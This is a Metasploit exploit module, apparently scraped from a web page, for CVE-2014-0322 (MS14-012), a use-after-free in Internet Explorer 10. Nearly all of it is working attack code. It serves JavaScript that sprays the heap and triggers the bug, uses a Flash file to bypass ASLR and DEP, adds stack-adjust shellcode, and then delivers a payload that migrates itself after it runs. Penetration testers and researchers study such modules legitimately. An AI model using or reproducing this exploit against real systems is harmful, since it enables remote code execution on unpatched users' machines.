# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::BrowserExploitServer
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "MS14-012 Microsoft Internet Explorer CMarkup Use-After-Free",
      &#039;Description&#039;    => %q{
        This module exploits an use after free condition on Internet Explorer as used in the wild
        on the "Operation SnowMan" in February 2014. The module uses Flash Player 12 in order to
        bypass ASLR and finally DEP.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Unknown&#039;, # Vulnerability discovery and Exploit in the wild
          &#039;Jean-Jamil Khalife&#039;, # Exploit
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2014-0322&#039; ],
          [ &#039;MSB&#039;, &#039;MS14-012&#039; ],
          [ &#039;BID&#039;, &#039;65551&#039; ],
          [ &#039;URL&#039;, &#039;http://www.fireeye.com/blog/technical/cyber-exploits/2014/02/operation-snowman-deputydog-actor-compromises-us-veterans-of-foreign-wars-website.html&#039;],
          [ &#039;URL&#039;, &#039;http://hdwsec.fr/blog/CVE-2014-0322.html&#039; ]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;          => 960,
          &#039;DisableNops&#039;    => true,
          &#039;PrependEncoder&#039; => stack_adjust
        },
      &#039;BrowserRequirements&#039; =>
        {
          :source      => /script|headers/i,
          :os_name     => Msf::OperatingSystems::WINDOWS,
          :os_flavor   => Msf::OperatingSystems::WindowsVersions::SEVEN,
          :ua_name     => Msf::HttpClients::IE,
          :ua_ver      => &#039;10.0&#039;,
          :mshtml_build => lambda { |ver| ver.to_i < 16843 },
          :flash       => /^12\./
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
          &#039;Retries&#039;              => false
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows 7 SP1 / IE 10 / FP 12&#039;, { } ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Feb 13 2014",
      &#039;DefaultTarget&#039;  => 0))
 
  end
 
  def stack_adjust
    adjust = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18 # get teb
    adjust << "\x83\xC0\x08"             # add eax, byte 8 # get pointer to stacklimit
    adjust << "\x8b\x20"                 # mov esp, [eax] # put esp at stacklimit
    adjust << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a little offset
 
    adjust
  end
 
  def create_swf
    path = ::File.join( Msf::Config.data_directory, "exploits", "CVE-2014-0322", "AsXploit.swf" )
    fd = ::File.open( path, "rb" )
    swf = fd.read(fd.stat.size)
    fd.close
    return swf
  end
 
  def exploit
    @swf = create_swf
    super
  end
 
  def on_request_uri(cli, request)
    print_status("Request: #{request.uri}")
 
    if request.uri =~ /\.swf$/
      print_status("Sending SWF...")
      send_response(cli, @swf, {&#039;Content-Type&#039;=>&#039;application/x-shockwave-flash&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;})
      return
    end
 
    super
  end
 
  def on_request_exploit(cli, request, target_info)
    print_status("Sending HTML...")
    send_exploit_html(cli, exploit_template(cli, target_info))
  end
 
  def exploit_template(cli, target_info)
 
    flash_payload = ""
    get_payload(cli,target_info).unpack("V*").each do |i|
      flash_payload << "0x#{i.to_s(16)},"
    end
    flash_payload.gsub!(/,$/, "")
 
    html_template = %Q|
    <html>
    <head>
    </head>
    <body>
 
    <script>
 
    var g_arr = [];
    var arrLen = 0x250;
 
    function dword2data(dword)
    {
      var d = Number(dword).toString(16);
      while (d.length < 8)
        d = &#039;0&#039; + d;
 
      return unescape(&#039;%u&#039; + d.substr(4, 8) + &#039;%u&#039; + d.substr(0, 4));
    }
 
    function eXpl()
    {
      var a=0;
 
      for (a=0; a < arrLen; a++) {
          g_arr[a] = document.createElement(&#039;div&#039;);
      }
 
      var b = dword2data(0x19fffff3);
 
      while (b.length < 0x360) {
        if (b.length == (0x98 / 2))
        {
          b += dword2data(0x1a000010);
        }
        else if (b.length == (0x94 / 2))
        {
          b += dword2data(0x1a111111);
        }
        else if (b.length == (0x15c / 2))
        {
          b += dword2data(0x42424242);
        }
        else
        {
          b += dword2data(0x19fffff3);
        }
      }
 
      var d = b.substring(0, ( 0x340 - 2 )/2);
 
      try{
        this.outerHTML=this.outerHTML
      } catch(e){
 
      }
 
      CollectGarbage();
 
      for (a=0; a < arrLen; a++)
        {
          g_arr[a].title = d.substring(0, d.length);
        }
    }
 
    function trigger()
    {
        var a = document.getElementsByTagName("script");
        var b = a[0];
        b.onpropertychange = eXpl;
        var c = document.createElement(&#039;SELECT&#039;);
        c = b.appendChild(c);
    }
 
    </script>
    <embed src=#{rand_text_alpha(4 + rand(3))}.swf FlashVars="version=<%=flash_payload%>" width="10" height="10">
    </embed>
    </body>
    </html>
    |
 
    return html_template, binding()
  end
 
end

